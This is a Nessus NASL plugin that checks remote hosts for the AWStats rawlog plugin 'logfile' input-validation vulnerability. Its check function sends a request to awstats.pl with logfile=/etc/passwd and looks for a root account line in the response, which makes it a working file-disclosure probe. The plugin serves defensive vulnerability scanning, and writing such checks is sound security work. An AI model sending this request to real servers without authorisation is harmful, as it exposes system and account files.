#  This script was written by David Maciejak <david dot maciejak at kyxar dot fr>
#  based on work from
#  (C) Tenable Netwok Security
#
# Ref: Johnathan Bat <spam@blazemail.com>
#
# This script is released under the GNU GPLv2

if(description)
{
 script_id(14347);

 script_bugtraq_id(10950);
 script_xref(name:"OSVDB", value:"9109");

 name["english"] = "AWStats rawlog plugin logfile parameter input validation vulnerability";

 script_name(english:name["english"]);
 script_version ("$Revision: 1.5 $");
 
 desc["english"] = "
The remote host seems to be running AWStats, a free real-time logfile analyzer.

AWStats Rawlog Plugin is reported prone to an input validation vulnerability. 
The issue is reported to exist because user supplied 'logfile' URI data passed
to the 'awstats.pl' script is not sanitized.

An attacker may exploit this condition to execute commands remotely or disclose 
contents of web server readable files. 

Solution : Upgrade to the latest version of this software
Risk factor : High";



 script_description(english:desc["english"]);
 
 summary["english"] = "Determines the presence of AWStats awstats.pl";

 script_summary(english:summary["english"]);
 
 script_category(ACT_GATHER_INFO);
 
 script_copyright(english:"This script is Copyright (C) 2004 David Maciejak");
 script_family(english:"CGI abuses", francais:"Abus de CGI");
 
 script_dependencies("http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);
if ( ! port ) exit(0);

function check(url)
{
	req = http_get(port:port, item:url + "/awstats.pl?filterrawlog=&rawlog_maxlines=5000&config=" + get_host_name() + "&framename=main&pluginmode=rawlog&logfile=/etc/passwd");
 	res = http_keepalive_send_recv(port:port, data:req);
 	if ( res == NULL ) 
		exit(0);
	if ( egrep(pattern:"root:.*:0:[01]:.*", string:res) )
	{
	 	security_hole(port);
	 	exit(0);
	}
}

check(url:"/awstats");
check(url:"/stats");
check(url:"/stat");
foreach dir ( cgi_dirs() )
{
  check(url:dir);
}
